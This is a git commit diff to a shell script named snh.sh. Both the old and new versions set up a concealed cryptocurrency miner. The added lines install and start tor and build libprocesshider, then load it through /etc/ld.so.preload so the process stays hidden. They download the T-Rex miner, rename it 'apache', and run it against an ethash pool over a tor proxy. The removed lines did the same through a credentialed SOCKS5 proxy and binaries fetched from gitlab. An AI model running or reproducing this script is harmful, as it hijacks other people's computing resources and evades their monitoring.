2eaf85019a4edd297edf6a4cae5d6cbf3a1ec041
rosianakicha <97800283+rosianakicha@users.noreply.github.com>
2022-05-11 09:38:45 -0500

    Update snh.sh

--- snh.sh
+++ snh.sh
@@ -1,48 +1,19 @@
-ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone
+
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
 
-
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen
-
-apt-get install libpci3
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
-nohup wget https://gitlab.com/randukapuk625/novi/-/raw/main/grapLol.tar.gz > nohup.out
-
-tar -xvzf grapLol.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 45.86.71.9:6269
-socks5_username = lebarankita
-socks5_password = buatTHRan
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-nohup wget https://gitlab.com/randukapuk625/novi/-/raw/main/mini > nohup.out
-make
-chmod +x mini
-ph add mini
-
-wget https://gitlab.com/randukapuk625/novi/-/raw/main/Magicmini.zip > nohup.out
-make
-nohup unzip Magicmini.zip > nohup.out
-make
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-nohup ./graftcp/graftcp ./mini --url=ssl://teguhcong.usahabener@ethash.poolbinance.com:1800 --log --extra > nohup.out
+mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
+
+wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
+tar -xf t-rex-0.25.15-linux.tar.gz
+mv t-rex apache
+
+screen sudo ./apache -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -o stratum+tcp://ethash.poolbinance.com:443 -p x --proxy 127.0.0.1:9050 -u teguhcong -w $(echo $(shuf -i 1-2000 -n 1)) --gpu-report-interval 5 --mt 1
